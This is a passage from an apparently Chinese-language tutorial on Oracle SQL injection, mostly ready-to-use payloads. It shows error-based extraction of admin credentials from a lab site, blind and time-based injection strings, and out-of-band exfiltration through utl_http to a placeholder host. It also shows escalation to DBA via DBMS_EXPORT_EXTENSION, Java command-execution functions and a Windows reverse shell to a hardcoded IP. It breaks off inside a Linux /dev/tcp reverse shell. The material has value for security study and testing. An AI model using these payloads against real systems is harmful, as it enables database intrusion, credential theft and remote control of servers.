<figure class="highlight llvm"><table><tr><td class="code"><pre><span class="line">http://o<span class="number">1</span>.lab.aqlab.cn:<span class="number">81</span>/?id=<span class="number">1</span><span class="symbol">%20</span><span class="keyword">and</span><span class="symbol">%201</span>=ctxsys.drithsx.sn(<span class="number">1</span>,(<span class="keyword">select</span><span class="symbol">%20</span>table_name<span class="symbol">%20</span>from<span class="symbol">%20</span>user_tables<span class="symbol">%20</span>where<span class="symbol">%20</span>rownum=<span class="number">1</span>))<span class="symbol">%20</span>--+</span><br></pre></td></tr></table></figure>

<p><img src="//choge.top/2020/04/16/Oracle数据库注入总结/image-20200728090715989.png" alt="image-20200728090715989"></p>
<p>继续查看其他数据表</p>
<figure class="highlight llvm"><table><tr><td class="code"><pre><span class="line">http://o<span class="number">1</span>.lab.aqlab.cn:<span class="number">81</span>/?id=<span class="number">1</span><span class="symbol">%20</span><span class="keyword">and</span><span class="symbol">%201</span>=ctxsys.drithsx.sn(<span class="number">1</span>,(<span class="keyword">select</span><span class="symbol">%20</span>table_name<span class="symbol">%20</span>from<span class="symbol">%20</span>user_tables<span class="symbol">%20</span>where table_name&lt;&gt;'NEWS'<span class="symbol">%20</span><span class="keyword">and</span><span class="symbol">%20</span>rownum=<span class="number">1</span>))<span class="symbol">%20</span>--+</span><br></pre></td></tr></table></figure>

<p><img src="//choge.top/2020/04/16/Oracle数据库注入总结/image-20200728090731031.png" alt="image-20200728090731031"></p>
<p>查看ADMIN表字段</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">http://o1.lab.aqlab.cn:81/?id=1 and 1=ctxsys.drithsx.sn(1,(<span class="keyword">select</span> column_name <span class="keyword">from</span> user_tab_columns <span class="keyword">where</span> table_name=<span class="string">'ADMIN'</span> <span class="keyword">and</span> <span class="keyword">rownum</span>=<span class="number">1</span>)) <span class="comment">--+</span></span><br></pre></td></tr></table></figure>

<p><img src="//choge.top/2020/04/16/Oracle数据库注入总结/image-20200728090757634.png" alt="image-20200728090757634"></p>
<p>继续查看其他字段</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">http://o1.lab.aqlab.cn:81/?id=1 and 1=ctxsys.drithsx.sn(1,(<span class="keyword">select</span> column_name <span class="keyword">from</span> user_tab_columns <span class="keyword">where</span> table_name=<span class="string">'ADMIN'</span> <span class="keyword">and</span> column_name&lt;&gt;<span class="string">'ID'</span> <span class="keyword">and</span> <span class="keyword">rownum</span>=<span class="number">1</span>)) <span class="comment">--+</span></span><br></pre></td></tr></table></figure>

<p><img src="//choge.top/2020/04/16/Oracle数据库注入总结/image-20200728090824945.png" alt="image-20200728090824945"></p>
<p>继续查看其他字段</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">http://o1.lab.aqlab.cn:81/?id=1 and 1=ctxsys.drithsx.sn(1,(<span class="keyword">select</span> column_name <span class="keyword">from</span> user_tab_columns <span class="keyword">where</span> table_name=<span class="string">'ADMIN'</span> <span class="keyword">and</span> column_name&lt;&gt;<span class="string">'ID'</span> <span class="keyword">and</span> column_name&lt;&gt;<span class="string">'UNAME'</span> <span class="keyword">and</span> <span class="keyword">rownum</span>=<span class="number">1</span>)) <span class="comment">--+</span></span><br></pre></td></tr></table></figure>

<p><img src="//choge.top/2020/04/16/Oracle数据库注入总结/image-20200728090854801.png" alt="image-20200728090854801"></p>
<p>查看数据内容</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">http://o1.lab.aqlab.cn:81/?id=1 and 1=ctxsys.drithsx.sn(1,(<span class="keyword">select</span> UNAME <span class="keyword">from</span> <span class="keyword">ADMIN</span> <span class="keyword">where</span> <span class="keyword">rownum</span>=<span class="number">1</span>)) <span class="comment">--+</span></span><br></pre></td></tr></table></figure>

<p><img src="//choge.top/2020/04/16/Oracle数据库注入总结/image-20200728090922984.png" alt="image-20200728090922984"></p>
<p>继续查看其他数据内容，获得用户名admin</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">http://o1.lab.aqlab.cn:81/?id=1 and 1=ctxsys.drithsx.sn(1,(<span class="keyword">select</span> UNAME <span class="keyword">from</span> <span class="keyword">ADMIN</span> <span class="keyword">where</span> UNAME&lt;&gt;<span class="string">'我是管理员'</span> <span class="keyword">and</span> <span class="keyword">rownum</span>=<span class="number">1</span>)) <span class="comment">--+</span></span><br></pre></td></tr></table></figure>

<p><img src="//choge.top/2020/04/16/Oracle数据库注入总结/image-20200728090945299.png" alt="image-20200728090945299"></p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">http://o1.lab.aqlab.cn:81/?id=1 and 1=ctxsys.drithsx.sn(1,(<span class="keyword">select</span> UPASS <span class="keyword">from</span> <span class="keyword">ADMIN</span> <span class="keyword">where</span> <span class="keyword">rownum</span>=<span class="number">1</span>)) <span class="comment">--+</span></span><br></pre></td></tr></table></figure>

<p><img src="//choge.top/2020/04/16/Oracle数据库注入总结/image-20200728091040337.png" alt="image-20200728091040337"></p>
<h3 id="布尔盲注"><a href="#布尔盲注" class="headerlink" title="布尔盲注"></a>布尔盲注</h3><h4 id="使用decode函数"><a href="#使用decode函数" class="headerlink" title="使用decode函数"></a>使用decode函数</h4><p>substr(user,1,1) 是条件,’S’ 是要遍历的位置，如果匹配便返回翻译值 1, 否则使用默认值 0</p>
<figure class="highlight lisp"><table><tr><td class="code"><pre><span class="line"><span class="number">1</span>'and <span class="number">1</span>= (<span class="name">select</span> decode(<span class="name">substr</span>(<span class="name">user</span>,<span class="number">1</span>,<span class="number">1</span>),'S',(<span class="number">1</span>),<span class="number">0</span>) from dual --</span><br></pre></td></tr></table></figure>

<h4 id="使用instr"><a href="#使用instr" class="headerlink" title="使用instr"></a>使用instr</h4><p>使用 instr进行布尔盲注（select user from dual）是査询结果数据，Instr会返回 ‘SQL’ 位置数据在查询结果中的位置，未找到便返回 0, 可以通过对 ‘SQL’位置进行谝历和送代，获取到数据。类似 MYSQL regexp注入的方法。</p>
<figure class="highlight basic"><table><tr><td class="code"><pre><span class="line"><span class="symbol">1 </span><span class="keyword">and</span> <span class="number">1</span>=(<span class="keyword">instr</span>((select user from dual),<span class="comment">'SQL') --</span></span><br></pre></td></tr></table></figure>

<h3 id="时间盲注"><a href="#时间盲注" class="headerlink" title="时间盲注"></a>时间盲注</h3><h4 id="使用DBMS-PIPE-RECEIVE-MESSAGE"><a href="#使用DBMS-PIPE-RECEIVE-MESSAGE" class="headerlink" title="使用DBMS_PIPE.RECEIVE_MESSAGE()"></a>使用DBMS_PIPE.RECEIVE_MESSAGE()</h4><p>可以理解成DBMS_PIPE.RECEIVE_MESSAGE(‘任意值’,延迟时间)</p>
<figure class="highlight lsl"><table><tr><td class="code"><pre><span class="line"><span class="number">1</span>' and <span class="number">1</span>= (DBMS_PIPE.RECEIVE_MESSAGE('a',<span class="number">10</span>)) and '<span class="number">1</span>'='<span class="number">1</span></span><br></pre></td></tr></table></figure>

<figure class="highlight lsl"><table><tr><td class="code"><pre><span class="line"><span class="number">1</span>' AND <span class="number">7238</span>=(CASE WHEN (ASCII(SUBSTRC((SELECT NVL (CAST(USER AS VARCHAR(<span class="number">4000</span>)),CHR(<span class="number">32</span>)) FROM DUAL),<span class="number">3</span>,<span class="number">1</span>))&gt;<span class="number">96</span>) THEN DBMS.PIPE.RECEIVE_MESSAGE(CHR(<span class="number">71</span>)||CHR(<span class="number">106</span>)||CHR(<span class="number">72</span>)||CHR(<span class="number">73</span>),<span class="number">1</span>) ELSE <span class="number">7238</span> END) AND '<span class="number">1</span>'='<span class="number">1</span>&amp;sname=<span class="number">1</span></span><br></pre></td></tr></table></figure>

<h4 id="使用decode"><a href="#使用decode" class="headerlink" title="使用decode()"></a>使用decode()</h4><p><code>(select count（*）from all objects)</code>会花费更多是时间去查询所有数据库的条目，类似</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">id=1&amp;sname=1'and 1= (<span class="keyword">select</span> <span class="keyword">decode</span> (<span class="keyword">substr</span> (<span class="keyword">user</span>,<span class="number">1</span>,<span class="number">1</span>),<span class="string">'S'</span>,(<span class="keyword">select</span> <span class="keyword">count</span> (*) <span class="keyword">from</span> <span class="keyword">all</span> objects),<span class="number">0</span>) <span class="keyword">from</span> dual) <span class="keyword">and</span><span class="string">'1'</span>=<span class="string">'1</span></span><br></pre></td></tr></table></figure>

<p>####使用 decode 与 DBMS_PIPE.RECEIVE_MESSAGE 嵌套的方式进行时可盲注</p>
<figure class="highlight lsl"><table><tr><td class="code"><pre><span class="line">id=<span class="number">1</span>&amp;sname=<span class="number">1</span>'and <span class="number">1</span>= (select decode (substr(user,<span class="number">1</span>,<span class="number">1</span>),'A',DBMS_PIPE.RECEIVE_MESSAGE('RDS',<span class="number">5</span>),<span class="number">0</span>)</span><br><span class="line">from dual) and'<span class="number">1</span>'='<span class="number">1</span></span><br></pre></td></tr></table></figure>

<h3 id="外带通信盲注"><a href="#外带通信盲注" class="headerlink" title="外带通信盲注"></a>外带通信盲注</h3><p>参考ceye的payload</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">poyload：http://xxx.xxx.xx.xx/xxx/selcet?suser=1&amp;sname=1'  and 1=utl_http.request('http://XXXXXXXXXXX/'||(<span class="keyword">select</span> banner <span class="keyword">from</span> sys.v_$<span class="keyword">version</span> <span class="keyword">where</span> <span class="keyword">rownum</span>=<span class="number">1</span>)) <span class="comment">--</span></span><br></pre></td></tr></table></figure>

<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">http://xxx.xxx.xx.xx/xxx/selcet?suser=1&amp;sname=1' and (<span class="keyword">select</span> utl_inaddr.get_host_address((<span class="keyword">select</span> <span class="keyword">user</span> <span class="keyword">from</span> dual)||<span class="string">'.xxx.xxx'</span>) <span class="keyword">from</span> dual)<span class="keyword">is</span> <span class="keyword">not</span> <span class="literal">null</span><span class="comment">--</span></span><br></pre></td></tr></table></figure>

<h3 id="获取权限"><a href="#获取权限" class="headerlink" title="获取权限"></a>获取权限</h3><h4 id="执行JAVA命令"><a href="#执行JAVA命令" class="headerlink" title="执行JAVA命令"></a>执行JAVA命令</h4><p>#####使用DBMS_EXPORT_EXTENSION()方法</p>
<p>影响版本：Oracle 8.1.7.4, 9.2.0.1-9.2.0.7, 10.1.0.2-10.1.0.4, 10.2.0.1-10.2.0.2, XE(Fixed in CPU July 2006)</p>
<p>权限：None</p>
<p>该请求将导致查询”GRANT DBA TO PUBLIC”以SYS身份执行。 因为这个函数允许PL / SQL缺陷（PL / SQL注入）。一旦这个请求成功执行，PUBLIC获取DBA角色，从而提升当前user的特权</p>
<p>提权：该请求将导致查询”GRANT DBA TO PUBLIC”以SYS身份执行。 因为这个函数允许PL / SQL缺陷（PL / SQL注入）。一旦这个请求成功执行，PUBLIC获取DBA角色，从而提升当前user的特权</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">select SYS.DBMS_EXPORT_EXTENSION.GET_DOMAIN_INDEX_TABLES(<span class="string">'FOO'</span>,<span class="string">'BAR'</span>,<span class="string">'DBMS_OUTPUT".PUT(:P1);EXECUTE IMMEDIATE '</span><span class="string">'DECLARE PRAGMA AUTONOMOUS_TRANSACTION;BEGIN EXECUTE IMMEDIATE '</span><span class="string">'''grant dba to public'''</span><span class="string">';END;'</span><span class="string">';END;--'</span>,<span class="string">'SYS'</span>,<span class="number">0</span>,<span class="string">'1'</span>,<span class="number">0</span>) <span class="keyword">from</span> dual</span><br></pre></td></tr></table></figure>

<h6 id="创建Java库"><a href="#创建Java库" class="headerlink" title="创建Java库"></a>创建Java库</h6><figure class="highlight scilab"><table><tr><td class="code"><pre><span class="line"><span class="keyword">select</span> SYS.DBMS_EXPORT_EXTENSION.GET_DOMAIN_INDEX_TABLES(<span class="string">'FOO'</span>,<span class="string">'BAR'</span>,<span class="string">'DBMS_OUTPUT"</span>.PUT(:P1);EXECUTE IMMEDIATE <span class="string">''</span>DECLARE PRAGMA AUTONOMOUS_TRANSACTION;BEGIN EXECUTE IMMEDIATE <span class="string">''''</span>create <span class="built_in">or</span> replace <span class="built_in">and</span> compile java source named <span class="string">"LinxUtil"</span> as import java.io.*; public class LinxUtil extends Object &#123;public static String runCMD(String args)&#123;<span class="keyword">try</span>&#123;BufferedReader myReader= new BufferedReader(new InputStreamReader(Runtime.getRuntime().<span class="built_in">exec</span>(args).getInputStream() ) ); String stemp,str=<span class="string">""</span>;<span class="keyword">while</span> ((stemp = myReader.readLine()) != null) str +=stemp+<span class="string">"\n"</span>;myReader.close();<span class="keyword">return</span> str;&#125; <span class="keyword">catch</span> (Exception e)&#123;<span class="keyword">return</span> e.toString();&#125;&#125;public static String readFile(String filename)&#123;<span class="keyword">try</span>&#123;BufferedReader myReader= new BufferedReader(new FileReader(filename)); String stemp,str=<span class="string">""</span>;<span class="keyword">while</span> ((stemp = myReader.readLine()) != null) str +=stemp+<span class="string">"\n"</span>;myReader.close();<span class="keyword">return</span> str;&#125; <span class="keyword">catch</span> (Exception e)&#123;<span class="keyword">return</span> e.toString();&#125;&#125;&#125;<span class="string">''''</span>;END;<span class="string">''</span>;END;--<span class="string">','</span>SYS',<span class="number">0</span>,<span class="string">'1'</span>,<span class="number">0</span>) from dual</span><br></pre></td></tr></table></figure>

<p><img src="//choge.top/2020/04/16/Oracle数据库注入总结/image-20200728091140931.png" alt="image-20200728091140931"></p>
<h6 id="赋予Java权限"><a href="#赋予Java权限" class="headerlink" title="赋予Java权限"></a>赋予Java权限</h6><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">select SYS.DBMS_EXPORT_EXTENSION.GET_DOMAIN_INDEX_TABLES(<span class="string">'FOO'</span>,<span class="string">'BAR'</span>,<span class="string">'DBMS_OUTPUT".PUT(:P1);EXECUTE IMMEDIATE '</span><span class="string">'DECLARE PRAGMA AUTONOMOUS_TRANSACTION;BEGIN EXECUTE IMMEDIATE '</span><span class="string">'''begin dbms_java.grant_permission('''</span><span class="string">'''''PUBLIC'''</span><span class="string">''''', '''</span><span class="string">'''''SYS:java.io.FilePermission'''</span><span class="string">''''','''</span><span class="string">'''''&lt;&gt;'''</span><span class="string">''''', '''</span><span class="string">'''''execute'''</span><span class="string">''''');end;'''</span><span class="string">';END;'</span><span class="string">';END;--'</span>,<span class="string">'SYS'</span>,<span class="number">0</span>,<span class="string">'1'</span>,<span class="number">0</span>) <span class="keyword">from</span> dual</span><br></pre></td></tr></table></figure>

<h6 id="创建函数"><a href="#创建函数" class="headerlink" title="创建函数"></a>创建函数</h6><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">select SYS.DBMS_EXPORT_EXTENSION.GET_DOMAIN_INDEX_TABLES(<span class="string">'FOO'</span>,<span class="string">'BAR'</span>,<span class="string">'DBMS_OUTPUT".PUT(:P1);EXECUTE IMMEDIATE '</span><span class="string">'DECLARE PRAGMA AUTONOMOUS_TRANSACTION;BEGIN EXECUTE IMMEDIATE '</span><span class="string">'''create or replace function LinxRunCMD(p_cmd in varchar2) return varchar2 as language java name'''</span><span class="string">'''''LinxUtil.runCMD(java.lang.String) return String'''</span><span class="string">''''';'''</span><span class="string">';END;'</span><span class="string">';END;--'</span>,<span class="string">'SYS'</span>,<span class="number">0</span>,<span class="string">'1'</span>,<span class="number">0</span>) <span class="keyword">from</span> dual</span><br></pre></td></tr></table></figure>

<p>######赋予函数执行权限</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">select SYS.DBMS_EXPORT_EXTENSION.GET_DOMAIN_INDEX_TABLES(<span class="string">'FOO'</span>,<span class="string">'BAR'</span>,<span class="string">'DBMS_OUTPUT".PUT(:P1);EXECUTE IMMEDIATE '</span><span class="string">'DECLARE PRAGMA AUTONOMOUS_TRANSACTION;BEGIN EXECUTE IMMEDIATE '</span><span class="string">'''grant all on LinxRunCMD to public'''</span><span class="string">';END;'</span><span class="string">';END;--'</span>,<span class="string">'SYS'</span>,<span class="number">0</span>,<span class="string">'1'</span>,<span class="number">0</span>) <span class="keyword">from</span> dual</span><br></pre></td></tr></table></figure>

<h6 id="执行"><a href="#执行" class="headerlink" title="执行"></a>执行</h6><figure class="highlight cs"><table><tr><td class="code"><pre><span class="line"><span class="keyword">select</span> sys.LinxRunCMD(<span class="string">'/bin/bash -c /usr/bin/whoami'</span>) <span class="keyword">from</span> dual</span><br></pre></td></tr></table></figure>

<h5 id="使用dbms-xmlquery-newcontext-方法"><a href="#使用dbms-xmlquery-newcontext-方法" class="headerlink" title="使用dbms_xmlquery,newcontext()方法"></a>使用dbms_xmlquery,newcontext()方法</h5><p>影响版本：Oracle 8.1.7.4, 9.2.0.1-9.2.0.7, 10.1.0.2-10.1.0.4, 10.2.0.1-10.2.0.2, XE(Fixed in CPU July 2006)</p>
<p>DBMS_EXPORT_EXTENSION存在漏洞情况下，否则赋予权限时无法成功</p>
<h6 id="创建Java包"><a href="#创建Java包" class="headerlink" title="创建Java包"></a>创建Java包</h6><figure class="highlight scala"><table><tr><td class="code"><pre><span class="line">select dbms_xmlquery.newcontext(<span class="symbol">'declare</span> <span class="type">PRAGMA</span> <span class="type">AUTONOMOUS_TRANSACTION</span>;begin execute immediate '<span class="symbol">'create</span> or replace and compile java source named <span class="string">"LinxUtil"</span> as <span class="keyword">import</span> java.io.*; public <span class="class"><span class="keyword">class</span> <span class="title">LinxUtil</span> <span class="keyword">extends</span> <span class="title">Object</span> </span>&#123;public static <span class="type">String</span> runCMD(<span class="type">String</span> args) &#123;<span class="keyword">try</span>&#123;<span class="type">BufferedReader</span> myReader= <span class="keyword">new</span> <span class="type">BufferedReader</span>(<span class="keyword">new</span> <span class="type">InputStreamReader</span>( <span class="type">Runtime</span>.getRuntime().exec(args).getInputStream() ) ); <span class="type">String</span> stemp,str=<span class="string">""</span>;<span class="keyword">while</span> ((stemp = myReader.readLine()) != <span class="literal">null</span>) str +=stemp+<span class="string">"\n"</span>;myReader.close();<span class="keyword">return</span> str;&#125; <span class="keyword">catch</span> (<span class="type">Exception</span> e)&#123;<span class="keyword">return</span> e.toString();&#125;&#125;&#125;'';commit;end;') from dual;</span><br></pre></td></tr></table></figure>

<p>通过以下命令可以查看all_objects内部改变：</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">select</span> * <span class="keyword">from</span> all_objects <span class="keyword">where</span> object_name <span class="keyword">like</span> <span class="string">'%LINX%'</span> <span class="keyword">or</span> object_name <span class="keyword">like</span> <span class="string">'%Linx%'</span></span><br></pre></td></tr></table></figure>

<p><img src="//choge.top/2020/04/16/Oracle数据库注入总结/image-20200728091219469.png" alt="image-20200728091219469"></p>
<h6 id="赋予当前用户java权限"><a href="#赋予当前用户java权限" class="headerlink" title="赋予当前用户java权限"></a>赋予当前用户java权限</h6><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">select user <span class="keyword">from</span> dual  <span class="comment">#查看当前用户</span></span><br><span class="line"></span><br><span class="line">select SYS.DBMS_EXPORT_EXTENSION.GET_DOMAIN_INDEX_TABLES(<span class="string">'FOO'</span>,<span class="string">'BAR'</span>,<span class="string">'DBMS_OUTPUT".PUT(:P1);EXECUTE IMMEDIATE '</span><span class="string">'DECLARE PRAGMA AUTONOMOUS_TRANSACTION;BEGIN EXECUTE IMMEDIATE '</span><span class="string">'''begin dbms_java.grant_permission('''</span><span class="string">'''''YY'''</span><span class="string">''''', '''</span><span class="string">'''''SYS:java.io.FilePermission'''</span><span class="string">''''','''</span><span class="string">'''''&lt;&lt;ALL FILES&gt;&gt;'''</span><span class="string">''''', '''</span><span class="string">'''''execute'''</span><span class="string">''''');end;'''</span><span class="string">';END;'</span><span class="string">';END;--'</span>,<span class="string">'SYS'</span>,<span class="number">0</span>,<span class="string">'1'</span>,<span class="number">0</span>) <span class="keyword">from</span> dual;</span><br></pre></td></tr></table></figure>

<p>查看可用的java权限列表，通过以下命令查看赋权情况</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">select</span> * <span class="keyword">from</span> user_java_policy <span class="keyword">where</span> grantee_name=<span class="string">'YY'</span>;</span><br></pre></td></tr></table></figure>

<p><img src="//choge.top/2020/04/16/Oracle数据库注入总结/image-20200728091255210.png" alt="image-20200728091255210"></p>
<p>若赋权失败，最后执行命令时会报错</p>
<h6 id="创建函数-1"><a href="#创建函数-1" class="headerlink" title="创建函数"></a>创建函数</h6><figure class="highlight ada"><table><tr><td class="code"><pre><span class="line"><span class="keyword">select</span> dbms_xmlquery.newcontext(<span class="symbol">'declare</span> <span class="keyword">PRAGMA</span> AUTONOMOUS_TRANSACTION;<span class="keyword">begin</span> execute immediate '<span class="symbol">'create</span> <span class="keyword">or</span> replace <span class="keyword">function</span> <span class="title">LinxRunCMD</span>(p_cmd in varchar2) <span class="keyword">return</span> <span class="type">varchar2</span> as language java name <span class="string">'''</span><span class="symbol">'LinxUtil.runCMD</span>(java.lang.String) <span class="keyword">return</span> String<span class="string">'''</span>'; '';commit;<span class="keyword">end</span>;') from dual;</span><br></pre></td></tr></table></figure>

<p>判断是否成功</p>
<figure class="highlight cs"><table><tr><td class="code"><pre><span class="line"><span class="keyword">select</span> OBJECT_ID <span class="keyword">from</span> all_objects <span class="keyword">where</span> object_name =<span class="string">'LINXRUNCMD'</span></span><br></pre></td></tr></table></figure>

<p>也可通过查看all_objects内部改变判断</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">select</span> * <span class="keyword">from</span> all_objects <span class="keyword">where</span> object_name <span class="keyword">like</span> <span class="string">'%LINX%'</span> <span class="keyword">or</span> object_name <span class="keyword">like</span> <span class="string">'%Linx%'</span></span><br></pre></td></tr></table></figure>

<p>若想删除创建的函数，通过以下命令删除</p>
<figure class="highlight ada"><table><tr><td class="code"><pre><span class="line">drop <span class="keyword">function</span> <span class="title">LinxRunCMD</span></span><br></pre></td></tr></table></figure>

<h6 id="执行-1"><a href="#执行-1" class="headerlink" title="执行"></a>执行</h6><figure class="highlight cs"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">select</span> <span class="title">LinxRunCMD</span>(<span class="params"><span class="string">'id'</span></span>) <span class="keyword">from</span> dual</span></span><br></pre></td></tr></table></figure>

<p><img src="//choge.top/2020/04/16/Oracle数据库注入总结/image-20200728091335799.png" alt="image-20200728091335799"></p>
<h5 id="使用dbms-xmlquery-newcontext-方法-1"><a href="#使用dbms-xmlquery-newcontext-方法-1" class="headerlink" title="使用dbms_xmlquery.newcontext()方法"></a>使用dbms_xmlquery.newcontext()方法</h5><p>影响版本： 10g R2, 11g R1, 11g R2</p>
<h6 id="使用java-privileges"><a href="#使用java-privileges" class="headerlink" title="使用java privileges"></a>使用java privileges</h6><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">Select</span> DBMS_JAVA_TEST.FUNCALL(<span class="string">'oracle/aurora/util/Wrapper'</span>,<span class="string">'main'</span>,<span class="string">'/bin/bash'</span>,<span class="string">'-c'</span>,<span class="string">'pwd &gt; /tmp/pwd.txt'</span>) <span class="keyword">from</span> dual;</span><br></pre></td></tr></table></figure>

<p>执行时报如下错，貌似没赋权？实际上赋权后还是一样的错误</p>
<h3 id="反弹shell"><a href="#反弹shell" class="headerlink" title="反弹shell"></a>反弹shell</h3><h4 id="Windows"><a href="#Windows" class="headerlink" title="Windows"></a>Windows</h4><h5 id="创建java代码"><a href="#创建java代码" class="headerlink" title="创建java代码"></a>创建java代码</h5><figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="keyword">select</span> SYS.DBMS_EXPORT_EXTENSION.GET_DOMAIN_INDEX_TABLES(<span class="string">'FOO'</span>,<span class="string">'BAR'</span>,<span class="string">'DBMS_OUTPUT".PUT(:P1);EXECUTE IMMEDIATE '</span><span class="string">'DECLARE PRAGMA AUTONOMOUS_TRANSACTION;BEGIN EXECUTE IMMEDIATE '</span><span class="string">'''</span>create or replace and compile java source named <span class="string">"shell"</span> as <span class="keyword">import</span> java.io.*;<span class="keyword">import</span> java.net.*;public class shell&#123;public static void run() throws Exception &#123;Socket s = <span class="built_in">new</span> Socket(<span class="string">"139.199.109.184"</span>, <span class="number">80</span>);Process p = Runtime.getRuntime().exec(<span class="string">"cmd.exe"</span>);<span class="built_in">new</span> T(p.getInputStream(), s.getOutputStream()).start();<span class="built_in">new</span> T(p.getErrorStream(), s.getOutputStream()).start();<span class="built_in">new</span> T(s.getInputStream(), p.getOutputStream()).start();&#125;static class T extends Thread &#123;private InputStream i;private OutputStream u;public T(InputStream in, OutputStream out) &#123;this.u = out;this.i = in;&#125;public void run() &#123;BufferedReader n = <span class="built_in">new</span> BufferedReader(<span class="built_in">new</span> InputStreamReader(i));BufferedWriter w = <span class="built_in">new</span> BufferedWriter(<span class="built_in">new</span> OutputStreamWriter(u));char f[] = <span class="built_in">new</span> char[<span class="number">8192</span>];<span class="keyword">int</span> l;try &#123;while ((l = n.read(f, <span class="number">0</span>, f.length)) &gt; <span class="number">0</span>) &#123;w.write(f, <span class="number">0</span>, l);w.flush();&#125;&#125; catch (IOException e) &#123;&#125;try &#123;<span class="keyword">if</span> (n != null)n.<span class="built_in">close</span>();<span class="keyword">if</span> (w != null)w.<span class="built_in">close</span>();&#125; catch (Exception e) &#123;&#125;&#125;&#125;&#125;<span class="string">'''</span><span class="string">';END;'</span><span class="string">';END;--'</span>,<span class="string">'SYS'</span>,<span class="number">0</span>,<span class="string">'1'</span>,<span class="number">0</span>) from dual</span><br></pre></td></tr></table></figure>

<h5 id="赋予java执行权限"><a href="#赋予java执行权限" class="headerlink" title="赋予java执行权限"></a>赋予java执行权限</h5><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">select SYS.DBMS_EXPORT_EXTENSION.GET_DOMAIN_INDEX_TABLES(<span class="string">'FOO'</span>,<span class="string">'BAR'</span>,<span class="string">'DBMS_OUTPUT".PUT(:P1);EXECUTE IMMEDIATE '</span><span class="string">'DECLARE PRAGMA AUTONOMOUS_TRANSACTION;BEGIN EXECUTE IMMEDIATE '</span><span class="string">'''begin dbms_java.grant_permission( '''</span><span class="string">'''''PUBLIC'''</span><span class="string">''''', '''</span><span class="string">'''''SYS:java.net.SocketPermission'''</span><span class="string">''''', '''</span><span class="string">'''''&lt;&gt;'''</span><span class="string">''''', '''</span><span class="string">'''''*'''</span><span class="string">''''' );end;'''</span><span class="string">';END;'</span><span class="string">';END;--'</span>,<span class="string">'SYS'</span>,<span class="number">0</span>,<span class="string">'1'</span>,<span class="number">0</span>) <span class="keyword">from</span> dual</span><br></pre></td></tr></table></figure>

<h5 id="创建函数-2"><a href="#创建函数-2" class="headerlink" title="创建函数"></a>创建函数</h5><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">select SYS.DBMS_EXPORT_EXTENSION.GET_DOMAIN_INDEX_TABLES(<span class="string">'FOO'</span>,<span class="string">'BAR'</span>,<span class="string">'DBMS_OUTPUT" .PUT(:P1);EXECUTE IMMEDIATE '</span><span class="string">'DECLARE PRAGMA AUTONOMOUS_TRANSACTION;BEGIN EXECUTE IMMEDIATE '</span><span class="string">'''create or replace function reversetcp RETURN VARCHAR2 as language java name '''</span><span class="string">'''''shell.run() return String'''</span><span class="string">'''''; '''</span><span class="string">';END;'</span><span class="string">';END;--'</span>,<span class="string">'SYS'</span>,<span class="number">0</span>,<span class="string">'1'</span>,<span class="number">0</span>) <span class="keyword">from</span> dual</span><br></pre></td></tr></table></figure>

<h5 id="赋予函数执行权限"><a href="#赋予函数执行权限" class="headerlink" title="赋予函数执行权限"></a>赋予函数执行权限</h5><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">select SYS.DBMS_EXPORT_EXTENSION.GET_DOMAIN_INDEX_TABLES(<span class="string">'FOO'</span>,<span class="string">'BAR'</span>,<span class="string">'DBMS_OUTPUT" .PUT(:P1);EXECUTE IMMEDIATE '</span><span class="string">'DECLARE PRAGMA AUTONOMOUS_TRANSACTION;BEGIN EXECUTE IMMEDIATE '</span><span class="string">'''grant all on reversetcp to public'''</span><span class="string">';END;'</span><span class="string">';END;--'</span>,<span class="string">'SYS'</span>,<span class="number">0</span>,<span class="string">'1'</span>,<span class="number">0</span>) <span class="keyword">from</span> dual</span><br></pre></td></tr></table></figure>

<h5 id="反弹shell-1"><a href="#反弹shell-1" class="headerlink" title="反弹shell"></a>反弹shell</h5><figure class="highlight armasm"><table><tr><td class="code"><pre><span class="line"><span class="keyword">select </span>sys.<span class="keyword">reversetcp </span>from dual</span><br></pre></td></tr></table></figure>

<h4 id="Linux"><a href="#Linux" class="headerlink" title="Linux"></a>Linux</h4><p>java反弹代码如下，编译后执行</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> java.io.*;</span><br><span class="line"><span class="keyword">import</span> java.net.*;</span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">shellRev</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">        <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span></span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">                System.out.println(<span class="number">1</span>);</span><br><span class="line">                <span class="keyword">try</span>&#123;run();&#125;</span><br><span class="line">                <span class="keyword">catch</span>(Exception e)&#123;&#125;</span><br><span class="line">        &#125;</span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">run</span><span class="params">()</span> <span class="keyword">throws</span> Exception</span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">                String[] aaa=&#123;<span class="string">"/bin/bash"</span>,<span class="string">"-c"</span>,<span class="string">"exec 9&lt;&gt; /dev/tcp/192.168.1.50/8080;exec 0&lt;&amp;9;exec 